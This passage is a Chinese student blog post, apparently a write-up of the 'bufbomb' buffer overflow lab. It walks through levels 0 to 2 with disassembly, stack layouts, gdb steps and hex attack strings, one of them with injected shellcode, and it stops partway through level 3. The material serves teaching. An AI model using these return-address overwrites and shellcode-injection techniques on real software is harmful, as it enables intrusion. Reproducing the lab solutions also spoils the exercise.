@@ -1,0 +1,1240 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="实验介绍​        本实验的目的在于加深对IA-32函数调用规则和栈结构的具体理解。实验的主要内容是对一个可程序“bufbomb”实施一系列缓冲区溢出攻击（buffer overflow attacks），也就是设法通过造成缓冲区溢出来改变该可执行程序的运行内存映像，例如将给定的字节序列插入到其本不应出现的内存位置。​    实验中你需要对目标可执行程序bufbomb分别完成5个难度递增的缓">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LAB3：缓冲区溢出攻击">
+<meta property="og:url" content="http://yoursite.com/2019/09/11/LAB3：缓冲区溢出攻击/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="实验介绍​        本实验的目的在于加深对IA-32函数调用规则和栈结构的具体理解。实验的主要内容是对一个可程序“bufbomb”实施一系列缓冲区溢出攻击（buffer overflow attacks），也就是设法通过造成缓冲区溢出来改变该可执行程序的运行内存映像，例如将给定的字节序列插入到其本不应出现的内存位置。​    实验中你需要对目标可执行程序bufbomb分别完成5个难度递增的缓">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wy8pxc8cj30jm05e0t9.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wyf2aii9j30ki0503z0.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wyhxr2yij30iv071gm8.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wykuonafj30ir05o3z1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wypgv2y0j30kd03jq39.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wz4hbwpdj30j4063dgf.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzfxesj9j30hn06laar.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzibq5sjj30kk03oaae.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzm4l3wej30ip08eq3w.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzmwca0pj30il074q3q.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wzopcikaj30i60oen05.jpg">
+<meta property="og:updated_time" content="2019-09-12T12:07:54.630Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LAB3：缓冲区溢出攻击">
+<meta name="twitter:description" content="实验介绍​        本实验的目的在于加深对IA-32函数调用规则和栈结构的具体理解。实验的主要内容是对一个可程序“bufbomb”实施一系列缓冲区溢出攻击（buffer overflow attacks），也就是设法通过造成缓冲区溢出来改变该可执行程序的运行内存映像，例如将给定的字节序列插入到其本不应出现的内存位置。​    实验中你需要对目标可执行程序bufbomb分别完成5个难度递增的缓">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007IZMVBly1g6wy8pxc8cj30jm05e0t9.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/11/LAB3：缓冲区溢出攻击/">
+
+
+
+
+
+  <title>LAB3：缓冲区溢出攻击 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+      <a href="https://littleleft0215.github.io/"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/11/LAB3：缓冲区溢出攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Little left">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/blog-logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">LAB3：缓冲区溢出攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-11T13:58:57+08:00">
+                2019-09-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>​        本实验的目的在于加深对IA-32函数调用规则和栈结构的具体理解。实验的主要内容是对一个可程序“bufbomb”实施一系列缓冲区溢出攻击（buffer overflow attacks），也就是设法通过造成缓冲区溢出来改变该可执行程序的运行内存映像，例如将给定的字节序列插入到其本不应出现的内存位置。<br>​    实验中你需要对目标可执行程序bufbomb分别完成5个难度递增的缓冲区溢出攻击。5个难度级分别命名为smoke (level 0)、fizz (level 1)、bang (level 2)、boom (level 3)和kaboom (level 4)，其中smoke级最简单而kaboom级最困难。</p>
+<p>​    本次实验老师会给一个文档，按照要求做就可以找到类似下面的代码，这里就不做介绍了。</p>
+<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>​    本次实验是test函数中开始作用,调用了getbuf函数读取数据,所以我们先从getbuf函数入手</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049342 &lt;getbuf&gt;:</span><br><span class="line"> 8049342:	55                   	push   %ebp</span><br><span class="line"> 8049343:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049345:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	8d 45 ce             	lea    -0x32(%ebp),%eax</span><br><span class="line"> 804934e:	50                   	push   %eax</span><br><span class="line"> 804934f:	e8 ba fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049354:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049357:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804935c:	c9                   	leave  </span><br><span class="line"> 804935d:	c3                   	ret</span><br></pre></td></tr></table></figure>
+
+<p>可以看到栈中的情况，大致如下：</p>
+<p>Getbuf返回地址(高地址)</p>
+<p>存放ebp(存放buf内容)</p>
+<p>buf(ebp-0x32) (共50字节)<br>…<br>esp(低地址)</p>
+<p>那么下面进行第一关</p>
+<h3 id="Level-0-smoke"><a href="#Level-0-smoke" class="headerlink" title="Level 0: smoke"></a>Level 0: smoke</h3><p>本实验级别的任务是当getbuf函数执行它的return语句后，使bufbomb程序执行smoke函数的代码，而不是返回到test函数继续执行。（注意：你的攻击字符串可能会同时破坏了与本阶段无关的栈结构部分，但这不会造成问题，因为smoke函数会使程序直接结束。</p>
+<p>下面我们来看smoke函数代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">08048ba1 &lt;smoke&gt;:</span><br><span class="line"> 8048ba1:	55                   	push   %ebp</span><br><span class="line"> 8048ba2:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ba4:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ba7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048baa:	68 30 a3 04 08       	push   $0x804a330</span><br><span class="line"> 8048baf:	e8 5c fd ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048bb4:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bb7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bba:	6a 00                	push   $0x0</span><br><span class="line"> 8048bbc:	e8 fe 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bc1:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bc4:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bc7:	6a 00                	push   $0x0</span><br><span class="line"> 8048bc9:	e8 52 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于实验是要求我们修改getbuf的返回地址，在执行完getbuf后不是返回到原来的调用者test，而是跳到一个叫做smoke的函数里。那么我们修改getbuf返回地址,将其修改为smoke函数的地址,就可以达到实验的目的了。<br>首先smoke函数的首地址为08048ba1，所以我们应该建立一个txt文件输入58字节的16进制数，用来覆盖掉原机器指令。前50字节为buf数组的内容,可以为任意数,除了0a,也就是\n,否则会引起getbuf函数读取结束;后四字节为栈中ebp的值,因为我们只要将getbuf函数的返回地址修改就可以了,所以这四字节也可以为任意数,同样除了0a;最后四字节就是getbuf的返回地址（smoke首地址）,由于是小端机器,所以我们应该倒着输:==<strong>a1 8b 04 08.</strong>==</p>
+<p><strong>即50位任意数+4位任意数+smoke首地址</strong></p>
+<p>00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 <strong>a1 8b 04 08</strong></p>
+<p>我们需要编辑一个文档smoke.txt,通过通过hex2raw对bufbomb进行输入。<br>那么我们来试一试心不行吧<br>输入<strong>cat smoke.txt | ./hex2raw | ./bufbomb -u 17100021048</strong></p>
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wy8pxc8cj30jm05e0t9.jpg" alt="1.png"></p>
+<p>Ok，我们完成了。</p>
+<h3 id="Level-1-fizz"><a href="#Level-1-fizz" class="headerlink" title="Level 1: fizz"></a>Level 1: fizz</h3><p>与Level 0类似，本实验级别的任务是让bufbomb程序在其中的getbuf函数执行return语句后转而执行fizz函数的代码，而不是返回到test函数。不过，与Level 0的smoke函数不同，fizz函数需要一个输入参数，本级别要求设法将使用makecookie得到的cookie值作为参数传递给fizz函数。</p>
+<p>源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called fizz(0x%x)\n"</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Fizz函数代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">08048bce &lt;fizz&gt;:</span><br><span class="line"> 8048bce:	55                   	push   %ebp</span><br><span class="line"> 8048bcf:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bd1:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048bd4:	8b 55 08             	mov    0x8(%ebp),%edx//存放cookie的地址</span><br><span class="line"> 8048bd7:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048bdc:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048bde:	75 22                	jne    8048c02 &lt;fizz+0x34&gt;</span><br><span class="line"> 8048be0:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048be3:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048be6:	68 4b a3 04 08       	push   $0x804a34b</span><br><span class="line"> 8048beb:	e8 50 fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048bf0:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bf3:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bf6:	6a 01                	push   $0x1</span><br><span class="line"> 8048bf8:	e8 c2 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"></span><br><span class="line"> 8048bfd:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c00:	eb 13                	jmp    8048c15 &lt;fizz+0x47&gt;</span><br><span class="line"> 8048c02:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c05:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048c08:	68 6c a3 04 08       	push   $0x804a36c</span><br><span class="line"> 8048c0d:	e8 2e fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c12:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c15:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c18:	6a 00                	push   $0x0</span><br><span class="line"> 8048c1a:	e8 01 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据源码，我们可以看到fizz函数需要验证cookie<br>先看一下栈帧情况吧</p>
+<p>参数1（cookie）<br>Fizz返回地址<br>Getbuf返回地址<br>存储ebp</p>
+<p>也就是说，我们除了要把<strong>getbuf返回地址修改为fizz函数首地址,达到函数跳转的目的</strong>.，还要在<strong>fizz返回地址的上一个4字节处输入cookie</strong>（这里就是传入参数的地方）<br>需要输入的cookie（小端输入）：<strong>83 bf 54 57</strong><br>建立一个文件fizz.txt</p>
+<p>前50字节是随意输入的16进制数字（除0a），然后写入任意的4字节ebp，再写入getbuf的返回地址（即fizz函数的首地址）<strong>08 04 8b ce</strong>，再写入随意的4字节fizz返回地址。最后的4字节是cookie值。</p>
+<p>文本如下：</p>
+<p>00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 <strong>ce 8b 04 08</strong> 00 01 02 03 <strong>83 bf 54 57</strong></p>
+<p>那么我们试试</p>
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wyf2aii9j30ki0503z0.jpg" alt="2.png"></p>
+<h3 id="Level-2-bang"><a href="#Level-2-bang" class="headerlink" title="Level 2: bang"></a>Level 2: bang</h3><p>与Level 0和Level 1类似，本实验级别的任务是让bufbomb执行bang函数中的代码而不是返回到test函数继续执行。具体来讲，你的攻击代码应首先将全局变量global_value设置为对应你userid的cookie值，再将bang函数的地址压入栈中，然后执行一条ret指令从而跳至bang函数的代码继续执行。</p>
+<p><strong>Bang函数代码如下：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反汇编后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">08048c1f &lt;bang&gt;:</span><br><span class="line"> 8048c1f:	55                   	push   %ebp</span><br><span class="line"> 8048c20:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c22:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c25:	a1 40 d1 04 08       	mov    0x804d140,%eax //这里就是globle value</span><br><span class="line"> 8048c2a:	89 c2                	mov    %eax,%edx //cookie</span><br><span class="line"> 8048c2c:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048c31:	39 c2                	cmp    %eax,%edx //判断是否相等</span><br><span class="line"> 8048c33:	75 25                	jne    8048c5a &lt;bang+0x3b&gt;</span><br><span class="line"> 8048c35:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c3a:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c3d:	50                   	push   %eax</span><br><span class="line"> 8048c3e:	68 8c a3 04 08       	push   $0x804a38c</span><br><span class="line"> 8048c43:	e8 f8 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c48:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c4b:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c4e:	6a 02                	push   $0x2</span><br><span class="line"> 8048c50:	e8 6a 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048c55:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c58:	eb 16                	jmp    8048c70 &lt;bang+0x51&gt;</span><br><span class="line"> 8048c5a:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c5f:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c62:	50                   	push   %eax</span><br><span class="line"> 8048c63:	68 b1 a3 04 08       	push   $0x804a3b1</span><br><span class="line"> 8048c68:	e8 d3 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c6d:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c70:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c73:	6a 00                	push   $0x0</span><br><span class="line"> 8048c75:	e8 a6 fc ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以上，我们可以判断我们要把globle value所在的地址0x804d140修改为cookie的值，但是即使我们知道了，如何修改，我们也不清楚具体的机器指令是多少。我们通过对汇编的代码编译才行。那么我们先写出汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5754bf83,%eax  //把cookie的值存入eax</span><br><span class="line">mov $0x804d140,%ecx //把global value地址存入ecx</span><br><span class="line">mov %eax,(%ecx) //修改global_value的值为cookie</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wyhxr2yij30iv071gm8.jpg" alt="3.png"></p>
+<p>我们得到了机器码：</p>
+<p>​    0:  b8 83 bf 54 57          mov    $0x5754bf83,%eax</p>
+<p>   5:   b9 40 d1 04 08          mov    $0x804d140,%ecx</p>
+<p>   a:   89 01                           mov    %eax,(%ecx)</p>
+<p>   c:   c3                                  ret </p>
+<p>那么我们得到了13字节的机器指令<strong>b8 83 bf 54 57 b9 40 d1 04 08 89 01 c3</strong></p>
+<p>由于我们要覆盖的栈的部分是有限的，不能覆盖到其他的栈地址上面的内容，不然会造成无法估计的错误，那么我们就在前字节的部分输入机器指令。当程序运行到ret的部分的时候，就会跳转到getbuf返地址上面4字节的位置，也就是bang的首地址，所以我们要输入</p>
+<p><strong>13字节机器指令+37字节的随意指令+4字节覆盖ebp指令+4字节getbuf返回到buf的首地址（这个我们下面要进行动态调试查找）+bang首地址。</strong></p>
+<p>查找buf的首地址。动态调试查找过程</p>
+<p>gdb bufbomb</p>
+<p>break getbuf</p>
+<p>run -u 17100021048</p>
+<p>p/x <strong>($ebp-0x32)</strong></p>
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wykuonafj30ir05o3z1.jpg" alt="4.png"></p>
+<p>这样我就可以找到getbuf返回到buf首地址—-0x5568351e</p>
+<p>所以我们的bang.txt的文本：</p>
+<p>b8 83 bf 54 57 b9 40 d1 04 08 89 01 c3 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 00 01 02 03 1e 35 68 55 1f 8c 04 08</p>
+<p>那么我们来试一下</p>
+<p><img src="http://ww1.sinaimg.cn/large/007IZMVBly1g6wypgv2y0j30kd03jq39.jpg" alt="5.png"></p>
+<p>过关</p>
+<h3 id="Level-3-boom"><a href="#Level-3-boom" class="headerlink" title="Level 3: boom"></a>Level 3: boom</h3><p>本实验级别的任务是构造一个攻击字符串，使得getbuf函数将cookie值返回给test函数，而不是返回值1。除此之外，你的攻击代码应还原任何被破坏的状态，将正确返回地址压入栈中，并执行ret指令从而真正返回到test函数。</p>
+<p>我们先来看一下test的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048c7a &lt;test&gt;:</span><br><span class="line"> 8048c7a:	55                   	push   